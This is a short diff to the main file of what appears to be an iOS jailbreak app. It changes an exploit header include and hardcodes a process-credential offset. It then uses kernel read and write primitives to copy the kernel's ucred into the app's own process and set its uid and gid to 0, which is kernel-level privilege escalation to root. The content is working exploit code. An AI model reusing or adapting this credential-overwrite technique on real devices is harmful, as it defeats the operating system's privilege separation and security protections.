@@ -7,7 +7,7 @@
 
 #import <UIKit/UIKit.h>
 #import "AppDelegate.h"
-#include "exploit/exploit.h"
+#include "exploit/oob_entry.h"
 #include "exploit/memory.h"
 #include "exploit/patches.h"
 #include <copyfile.h>
@@ -32,11 +32,12 @@ int main(int argc, char * argv[]) {
     if (patch_kernel() != 0) return -1;
 
     uint32_t self_ucred = 0;
+    uint32_t proc_ucred = 0x84;
     if (getuid() != 0 || getgid() != 0) {
         print_log("[*] Set uid to 0...\n");
-        uint32_t kern_ucred = kread32(kinfo->kern_proc_addr + kinfo->offsets.proc.ucred);
-        self_ucred = kread32(kinfo->self_proc_addr + kinfo->offsets.proc.ucred);
-        kwrite32(kinfo->self_proc_addr + kinfo->offsets.proc.ucred, kern_ucred);
+        uint32_t kern_ucred = kread32(kinfo->kern_proc_addr + proc_ucred);
+        self_ucred = kread32(kinfo->self_proc_addr + proc_ucred);
+        kwrite32(kinfo->self_proc_addr + proc_ucred, kern_ucred);
         setuid(0);
         setgid(0);
     }
